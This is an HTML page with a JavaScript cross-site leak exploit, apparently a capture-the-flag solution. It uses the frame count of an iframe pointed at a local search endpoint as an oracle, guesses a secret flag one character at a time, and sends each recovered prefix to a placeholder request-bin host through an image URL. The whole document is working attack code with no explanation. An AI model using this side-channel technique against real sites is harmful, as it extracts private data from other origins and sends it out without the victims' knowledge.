<iframe id="iframe"></iframe>
<img id="img">
<script>
        async function bf(url) {
                return await new Promise((resolve, reject) => {
                        const iframe = document.getElementById("iframe");
                        iframe.src=url;
                        iframe.onload = () => {
                                if (iframe.contentWindow.frames.length != 0) {
                                        return resolve();
                                } else {
                                        return reject();
                                }
                        }
                });
        }

        async function search(query) {

                try {
                        await bf(`http://localhost:8000/search?query=${query}`);
                        return true;
                } catch(e) {
                        return false;
                }
        }

        async function attack() {
                let fchrs = "0123456789abcdef{}"
                let flag = "DH{";

                while (!flag.includes("}")) {
                        for (let c of fchrs) {
                                if (await search(flag + c)) {
                                        flag += c;
                                        img.src = `{REQUESTBIN_URL}/${flag}`;
                                        break;
                                }
                        }
                }
        }

        attack();
</script>